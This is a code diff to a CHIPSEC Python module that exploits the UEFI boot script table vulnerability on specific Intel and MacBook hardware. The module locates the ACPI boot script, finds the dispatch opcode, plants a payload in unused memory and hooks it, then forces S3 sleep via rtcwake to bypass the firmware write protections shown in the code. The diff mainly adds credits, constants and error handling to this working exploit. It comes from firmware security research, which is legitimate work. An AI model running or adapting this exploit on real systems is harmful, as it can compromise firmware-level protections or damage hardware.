@@ -1,3 +1,46 @@
+'''
+
+CHIPSEC module that exploits UEFI boot script table vulnerability.
+
+This vulnerability was discovered by Rafal Wojtczuk and Corey Kallenberg, check 
+original white paper:
+
+https://frab.cccv.de/system/attachments/2566/original/venamis_whitepaper.pdf
+
+
+More detailed exploit description:
+
+http://blog.cr4.sh/2015/02/exploiting-uefi-boot-script-table.html
+
+
+Latest version:
+
+https://github.com/Cr4sh/UEFI_boot_script_expl
+
+
+WARNING:
+
+Exploitation of this vulnerability is very hardware-specific because it depends on
+boot script table format and location.
+
+Exploit was tested with following hardware:  
+
+* Intel DQ77KB motherboard (Q77 chipset)
+
+* Apple MacBook Pro 10,2 (late 2012, QM77 chipset)
+
+Running this code on any other hardware may lead to unexpected problems.
+
+
+Written by:
+Dmytro Oleksiuk (aka Cr4sh)
+
+cr4sh0@gmail.com
+http://blog.cr4.sh
+
+'''
+
+import time
 from struct import pack, unpack
 
 from chipsec.module_common import *
@@ -386,6 +429,9 @@ class boot_script_table(BaseModule):
 
     WAKE_AFTER = 10 # in seconds
 
+    BOOT_SCRIPT_OFFSET = 0x18
+    BOOT_SCRIPT_MAX_LEN = 0x8000
+
     class CustomBootScriptParser(BootScriptParser):
 
         class AddressFound(Exception): 
@@ -507,12 +553,12 @@ class boot_script_table(BaseModule):
             if self._mem_read(addr - size, size) == '\0' * size:
 
                 addr -= size
-                break
+                return addr
 
             addr += page_size
             max_size += page_size
 
-        return addr
+        raise Exception('Unable to find unused memory to store payload')
 
     def _hook(self, addr, payload):        
 
@@ -558,14 +604,16 @@ class boot_script_table(BaseModule):
         print '[*] AcpiGlobalVariable = 0x%x' % AcpiGlobalVariable
 
         # get bootscript pointer
-        data = self._mem_read(AcpiGlobalVariable, 0x20)
-        boot_script = dword_at(data, 0x18)
+        data = self._mem_read(AcpiGlobalVariable, self.BOOT_SCRIPT_OFFSET + 8)
+        boot_script = dword_at(data, self.BOOT_SCRIPT_OFFSET)
 
         print '[*] UEFI boot script addr = 0x%x' % boot_script
 
-        assert boot_script != 0
+        if boot_script == 0:
+
+            raise Exception('Unable to locate boot script table')
         
-        data = self._mem_read(boot_script, 0x8000)
+        data = self._mem_read(boot_script, self.BOOT_SCRIPT_MAX_LEN)
 
         # read and parse boot script
         dispatch_addr = self.CustomBootScriptParser(quiet = True).parse( \
@@ -573,8 +621,7 @@ class boot_script_table(BaseModule):
 
         if dispatch_addr is None:
 
-            print 'ERROR: Unable to find EFI_BOOT_SCRIPT_DISPATCH_OPCODE'
-            return ModuleResult.ERROR
+            raise Exception('Unable to locate EFI_BOOT_SCRIPT_DISPATCH_OPCODE')
 
         print '[*] Target function addr = 0x%x' % dispatch_addr
 
@@ -594,6 +641,7 @@ class boot_script_table(BaseModule):
             print 'Going to S3 sleep for %d seconds ...' % self.WAKE_AFTER
 
             # go to the S3 sleep
+            time.sleep(3)
             os.system('rtcwake -m mem -s %d' % self.WAKE_AFTER)
 
             # read BIOS_CNTL and TSEGMB values that obtained saved by payload
